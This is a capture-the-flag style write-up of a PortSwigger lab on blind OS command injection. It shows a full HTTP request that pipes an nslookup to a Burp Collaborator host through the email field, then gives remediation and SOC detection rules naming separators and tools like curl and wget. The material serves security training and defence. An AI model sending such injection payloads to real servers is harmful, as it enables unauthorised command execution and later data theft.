# Blind OS Command Injection with Out-of-Band Interaction

| Field | Detail |
|---|---|
| Lab | Blind OS command injection with out-of-band interaction |
| Platform | PortSwigger Web Security Academy |
| Vulnerability | Blind OS Command Injection (out-of-band) |
| CWE | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| Severity | High |
| Date | 13 November 2026 |
| Author | Md Jahidur Rahman Jahid |

## Summary

The feedback form passes user-supplied input into a shell command on the
server without validation. The command output is never shown in the
response, and there is no timing clue this time — so the injection is
proven out-of-band: the server is made to perform a DNS lookup to a
Burp Collaborator address, and that lookup arriving at Collaborator
proves the command ran.

## Steps to Reproduce

1. Submit the feedback form and intercept the POST request in Burp Suite.
   Send it to Repeater. The request has five fields: `csrf`, `name`,
   `email`, `subject`, and `message`.
2. Get a Collaborator payload from Burp Collaborator — a unique subdomain
   like `<id>.burpcollaborator.net`. Any DNS lookup to it will be logged
   in the Collaborator tab.
3. First try: `&` before the payload in the `email` field. It did not
   work — in a form body, `&` separates parameters, so the server cut
   the email value off and the payload never reached the shell.
4. Second try: a single `|` worked:

```http
POST /feedback/submit HTTP/1.1
Host: [lab].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[REDACTED]

csrf=[REDACTED]&name=wiener&email=wiener%40gm.com|nslookup <id>.burpcollaborator.net|&subject=what+is+love&message=lhjkbljhvbljhh
```

Why `|` works here: a pipe runs the command on the right, feeding it the
output of the command on the left. `nslookup` does not need any piped
input — it only needs to run — and the rest of the application's own
command after the email field completes the pipe with valid syntax.
(The Collaborator subdomain above is shown as a placeholder — a real
one is unique to a Burp session and should not be published.)

5. Check the Burp Collaborator tab: a DNS lookup for the subdomain
   arrived from the lab server, proving the `nslookup` command ran.

## Evidence

- The injected request (above) with the `nslookup` payload in the
  `email` field.
- A DNS interaction logged in Burp Collaborator for the payload
  subdomain, coming from the lab server. No output appears in the HTTP
  response itself — the out-of-band DNS lookup is the proof.

## Impact

An attacker who can run OS commands on the server can:

- Confirm command execution even when the application shows no output
  and no timing difference, using out-of-band channels like DNS.
- Exfiltrate data through DNS (see the follow-up lab on out-of-band
  data exfiltration).
- Read sensitive files and configuration, steal or modify data, and in
  the worst case take full control of the server.

## Remediation

- Never build shell commands from user input. Use safe APIs or libraries
  instead of invoking the shell.
- If a shell call is unavoidable, validate the input strictly — for an
  email field, accept only a valid email format (allowlist) and reject
  everything else.
- Block outbound DNS and network access from the application server
  except to the services it genuinely needs — this breaks the
  out-of-band channel.
- Run the application with the least privilege needed.

## Detection (SOC)

- Alert on web requests where input fields contain command separators
  (`|`, `||`, `;`) or command words such as `nslookup`, `ping`,
  `curl`, or `wget`.
- Alert on DNS lookups from the application server to unusual or
  newly-seen external domains, especially long random-looking
  subdomains.
- Alert on unexpected child processes (shell commands, `nslookup`)
  spawned by the web server process.

## References

- PortSwigger — Blind OS command injection: https://portswigger.net/web-security/os-command-injection/blind
- PortSwigger — Burp Collaborator: https://portswigger.net/burp/documentation/desktop/tools/collaborator
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
